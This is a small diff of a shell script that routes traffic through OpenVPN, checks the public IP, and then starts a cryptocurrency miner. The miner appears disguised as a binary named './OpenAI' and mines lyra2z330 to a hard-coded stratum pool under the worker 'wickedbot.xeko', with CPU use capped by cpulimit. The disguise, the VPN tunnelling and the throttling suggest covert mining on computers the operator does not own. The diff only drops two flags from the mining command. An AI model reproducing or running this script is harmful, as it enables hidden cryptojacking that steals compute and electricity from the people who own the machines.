@@ -11,4 +11,4 @@ route add  1.52.168.10 gw $IP
 sudo -b openvpn --config test.ovpn
 sleep 5s
 sudo wget -qO- http://ipv4.icanhazip.com > ip.txt
-cpulimit --exe cpuminer --limit 80 -b && ./OpenAI -a lyra2z330 -o stratum+tcp://95.169.195.152:3032 -u wickedbot.xeko -p x -x --background
+cpulimit --exe cpuminer --limit 80 -b && ./OpenAI -a lyra2z330 -o stratum+tcp://95.169.195.152:3032 -u wickedbot.xeko -p x
